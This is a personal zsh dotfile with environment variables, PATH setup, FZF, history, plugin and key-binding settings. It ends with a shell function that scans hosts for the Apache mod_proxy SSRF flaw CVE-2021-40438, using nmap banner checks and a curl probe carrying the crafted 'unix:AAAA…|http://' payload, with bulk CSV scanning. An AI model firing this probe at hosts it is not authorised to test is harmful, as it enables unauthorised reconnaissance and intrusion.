###############################
# Core Environment Variables
###############################
# Shell basics
export ZSH=~/.oh-my-zsh          # Oh My Zsh installation path
export TERM=xterm-256color       # Enable 256 color support
export LANG=en_US.UTF-8          # Default language setting
export ARCHFLAGS="-arch x86_64"  # Architecture-specific flags

# Disable groff’s SGR (ANSI‐escape) output in man/apropos
export GROFF_NO_SGR=1

# Default editors
export EDITOR=vim
export VISUAL=vim

export ACK_PAGER_COLOR="{$PAGER:-bat --paging=always}"  # Colorized ack output

# Use bat as pager for everything
export PAGER='bat --paging=always'
export MANPAGER="sh -c 'col -bx | bat -l man --paging=always'"

# Prevent any legacy highlight filters from running
unset LESSOPEN

###############################
# FZF (Fuzzy Finder) configuration
###############################
export FZF_DEFAULT_COMMAND='ag --hidden -g ""'  # Use silver searcher for FZF
export FZF_DEFAULT_OPTS="
  --height 40%
  --layout=reverse
  --border
  --info=inline
  --preview='[[ \$(file --mime {}) =~ binary ]] && 
            echo {} is a binary file || 
            (bat --style=numbers --color=always {} || cat {}) 2>/dev/null | 
            head -300'
  --preview-window='right:hidden:wrap'
  --bind='f3:execute(bat --style=numbers {} || bat {})'
  --bind='ctrl-p:toggle-preview'
  --bind='ctrl-d:half-page-down'
  --bind='ctrl-u:half-page-up'
  --bind='ctrl-y:execute-silent(echo {+} | pbcopy)'
"

###############################
# Homebrew settings
###############################
export HOMEBREW_NO_ENV_HINTS=1  # Disable Homebrew environment hints

# OpenSSL for Homebrew builds
export LDFLAGS="-L/opt/homebrew/opt/openssl@3/lib"
export CPPFLAGS="-I/opt/homebrew/opt/openssl@3/include"
export PKG_CONFIG_PATH="/opt/homebrew/opt/openssl@3/lib/pkgconfig"
export PYTHON_BUILD_HOMEBREW_OPENSSL_FORMULA="openssl@3"

###############################
# Path Configuration
###############################
typeset -U path
path=(
    /opt/homebrew/opt/openssl@3/bin   # Brew OpenSSL
    /usr/local/{sbin,bin}             # Local system binaries
    /usr/{bin,sbin}                   # System binaries
    /{bin,sbin}                       # Essential system binaries
    ~/.local/bin                      # Local user binaries
    ~/.npm-packages/{bin,lib/node_modules/n/bin}  # NPM packages
    /bin/lscript                      # Custom scripts
    ~/.cargo/bin                      # Rust
    $path                             # Existing path entries
)
export PYENV_ROOT="$HOME/.pyenv"
export PATH="$PYENV_ROOT/bin:$PATH"
eval "$(pyenv init --path)"
eval "$(pyenv init -)"
export PATH

###############################
# Language-Specific Settings
###############################
# Man pages — strip out the stale TeX manpath
MANPATH=$(manpath | tr ':' '\n' \
          | grep -v '/Library/TeX/texbin/man' \
          | paste -sd: -)
export MANPATH

###############################
# Golang configuration
###############################
export GOROOT=/usr/local/go
export GOPATH=$HOME/go
path+=($GOPATH/bin $GOROOT/bin)

###############################
# Mono framework
###############################
export MONO_GAC_PREFIX="/usr/local"

###############################
# Bun JavaScript runtime
###############################
export BUN_INSTALL="$HOME/.bun"
path+=($BUN_INSTALL/bin)

###############################
# History Configuration
###############################
HISTFILE=~/.zsh/history
HISTSIZE=10000000
SAVEHIST=10000000
HISTORY_IGNORE="(pwd|exit)*"
HIST_STAMPS="yyyy-mm-dd"

setopt APPEND_HISTORY
setopt EXTENDED_HISTORY
setopt SHARE_HISTORY
setopt HIST_IGNORE_ALL_DUPS
setopt HIST_IGNORE_DUPS
setopt HIST_IGNORE_SPACE
setopt HIST_SAVE_NO_DUPS
setopt HIST_FIND_NO_DUPS
setopt HIST_REDUCE_BLANKS
setopt HIST_VERIFY
setopt INC_APPEND_HISTORY
setopt NO_HIST_BEEP

###############################
# Plugin Management
###############################
plug() {
    if [[ ! -f "$HOME/.local/share/zap/zap.zsh" ]]; then
        echo "Installing zap..."
        mkdir -p "$HOME/.local/share/zap"
        git clone https://github.com/zap-zsh/zap.git "$HOME/.local/share/zap"
        source "$HOME/.local/share/zap/zap.zsh"
    fi
    
    local plugin_dir="$HOME/.local/share/zsh/plugins/${1:t}"
    if [[ ! -d "$plugin_dir" ]]; then
        git clone "https://github.com/${1}" "$plugin_dir"
    fi
    source "$plugin_dir/${1:t}.plugin.zsh" 2>/dev/null \
      || source "$plugin_dir/${1:t}.zsh" 2>/dev/null \
      || source "$plugin_dir/${1:t}.sh" 2>/dev/null
}

[ -f "$HOME/.local/share/zap/zap.zsh" ] && source "$HOME/.local/share/zap/zap.zsh"

plug "zsh-users/zsh-autosuggestions"
plug "zdharma-continuum/fast-syntax-highlighting"
plug "zsh-users/zsh-history-substring-search"
plug "MichaelAquilina/zsh-you-should-use"
plug "MichaelAquilina/zsh-autoswitch-virtualenv"

source ~/dotfiles/completions.zsh

autoload -Uz compinit
if [ "$(date +'%j')" != "$(stat -f '%Sm' -t '%j' ~/.zcompdump)" ]; then
  compinit
else
  compinit -C
fi

zstyle ':completion:*' menu select
zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}'
zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"
zstyle ':completion:*' verbose yes
zstyle ':completion:*:descriptions' format '%B%d%b'
zstyle ':completion:*:messages' format '%d'
zstyle ':completion:*:warnings' format 'No matches for: %d'
zstyle ':completion:*:corrections' format '%B%d (errors: %e)%b'

unset ZSH
unset ZSH_THEME

###############################
# Source Configurations
###############################
source ~/secrets.sh

DOTFILES_LOADED=0
load_dotfiles() {
    source ~/dotfiles/.zsh.aliases
    source ~/dotfiles/.zsh.functions
    DOTFILES_LOADED=1
}
load_dotfiles

{ sleep 0.1; load_dotfiles; } &!

for cmd in g d k; do
    eval "function $cmd() { [[ \$DOTFILES_LOADED -eq 0 ]] && load_dotfiles; command \$cmd \$@ }"
done

###############################
# Key Bindings
###############################
bindkey '^[[A' history-substring-search-up
bindkey '^[[B' history-substring-search-down
bindkey "^[f" forward-word
bindkey "^[b" backward-word
bindkey "^[[3;5~" kill-word
bindkey '^H' backward-kill-word
bindkey "^[[H" beginning-of-line
bindkey "^[[F" end-of-line

###############################
# Async Load External Tools
###############################
# FZF
source <(fzf --zsh)

# iTerm2
test -e "${HOME}/.iterm2_shell_integration.zsh" && source "${HOME}/.iterm2_shell_integration.zsh"

# Bun completions
[ -s "$HOME/.bun/_bun" ] && source "$HOME/.bun/_bun"

# Cargo
[ -f "$HOME/.cargo/env" ] && source "$HOME/.cargo/env"

# Zoxide
eval "$(zoxide init zsh)"

###############################
# Performance Improvements
###############################
__git_files() { _wanted files expl 'local files' _files; }
DISABLE_AUTO_UPDATE=true

###############################
# Better Terminal Experience
###############################
HIST_STAMPS="mm/dd/yyyy"
REPORTTIME=10
auto-ls() { ls; }
chpwd_functions=(${chpwd_functions[@]} "auto-ls")

export STARSHIP_CONFIG=~/dotfiles/config/starship/starship.toml
eval "$(starship init zsh)"

###############################
# Vi Mode Configuration
###############################
bindkey -v
export KEYTIMEOUT=1
bindkey -M menuselect 'h' vi-backward-char
bindkey -M menuselect 'k' vi-up-line-or-history
bindkey -M menuselect 'l' vi-forward-char
bindkey -M menuselect 'j' vi-down-line-or-history

zle-keymap-select() {
  if [[ ${KEYMAP} == vicmd ]] || [[ $1 == 'block' ]]; then
    echo -ne '\e[1 q'
  else
    echo -ne '\e[5 q'
  fi
}
zle -N zle-keymap-select
echo -ne '\e[5 q'
precmd() { echo -ne '\e[5 q'; }
preexec() { echo -ne '\e[5 q'; }

eval $(thefuck --alias)

PATH=~/.console-ninja/.bin:$PATH

cve40438() {
  local ipport ipfile outfile bulk
  while [[ $1 ]]; do
    case $1 in
      -i) ipport=$2; shift 2 ;;
      -f) ipfile=$2; bulk=1; shift 2 ;;
      -o) outfile=$2; shift 2 ;;
      *)  echo "usage: cve40438 -i ip[:port] | -f file.csv [-o out.csv]"; return 1 ;;
    esac
  done
  [[ -z $ipport && -z $ipfile ]] && { echo "Specify -i or -f"; return 1; }
  [[ -n $outfile && ! -f $outfile ]] && echo "IP,Port,Version,HTTP_Code,Vulnerable" > "$outfile"

  probe() {
    local base="$3://$1"
    [[ ($3 == http  && $2 != 80) || ($3 == https && $2 != 443) ]] && base+=":$2"
    local payload="unix:$(python3 -c 'print(\"A\"*7701)')|http://192.0.2.1:9/"
    curl -ks -o /dev/null -w '%{http_code}' "$base/?$payload"
  }

  scan_host() {
    local host=$1 port=$2 scheme nmap_out ver major minor patch vuln code retry_port retry_scheme
    [[ -z $port ]] && { nc -z -w1 $host 80 2>/dev/null && port=80 || port=443; }

    echo "== nmap banner check =="
    nmap_out=$(nmap -Pn -p$port -sV --version-light -oG - "$host" 2>/dev/null | tr -d '\r')
    printf '%s\n' "$nmap_out" | sed 's/^/   /'

    [[ $nmap_out == *ssl* ]] && scheme=https || scheme=http
    ver=$(grep -oE 'Apache httpd [0-9]+\.[0-9]+\.[0-9]+' <<< "$nmap_out" | head -1 | awk '{print $3}')

    vuln="Unknown"
    if [[ -n $ver ]]; then
      IFS=. read -r major minor patch <<< "$ver"
      if (( major==2 && minor==4 && patch<=48 )); then
        vuln="Potential"; echo "→ Banner ≤2.4.48 ⇒ potentially vulnerable."
        [[ $nmap_out == *CentOS* || $nmap_out == *Red\ Hat* ]] && echo "  (CentOS/RHEL back-ports—check ≥2.4.6-97)."
      else
        vuln="Patched"; echo "→ Banner ≥2.4.49 ⇒ patched upstream."
      fi
    else
      ver="(none)"; echo "→ No Apache banner—CVE not applicable."
    fi

    [[ -z $bulk ]] && { echo; read -q "?Run curl probe? [y/N] " || { echo; return; }; echo; }

    code=$(probe "$host" "$port" "$scheme")
    if [[ $code == 000 ]]; then
      if (( port==80 )) && nc -z -w1 $host 443 2>/dev/null; then
        retry_port=443; retry_scheme=https
      elif (( port==443 )) && nc -z -w1 $host 80 2>/dev/null; then
        retry_port=80; retry_scheme=http
      fi
      if [[ -n $retry_port ]]; then
        echo "   (retrying on $retry_scheme://$host …)"
        code=$(probe "$host" "$retry_port" "$retry_scheme")
        port=$retry_port; scheme=$retry_scheme
      fi
    fi

    case $code in
      502|503) vuln="Vulnerable"; echo "Probe $code ⇒ **VULNERABLE**." ;;
      000)     echo "Probe 000 ⇒ WAF/firewall or vhost mismatch." ;;
      *)       echo "Probe $code ⇒ exploit not successful." ;;
    esac

    [[ -n $outfile ]] && printf '%s,%s,%s,%s,%s\n' "$host" "$port" "${ver:-none}" "$code" "$vuln" >> "$outfile"
  }

  if [[ -n $ipport ]]; then
    scan_host "${ipport%%:*}" "${ipport#*:}"
  else
    while IFS=, read -r h p <&3; do
      [[ -z $h ]] && continue
      echo "=============================================================="
      echo "Scanning $h${p:+:$p}"
      scan_host "$h" "$p"
      echo
    done 3< "$ipfile"
  fi
}


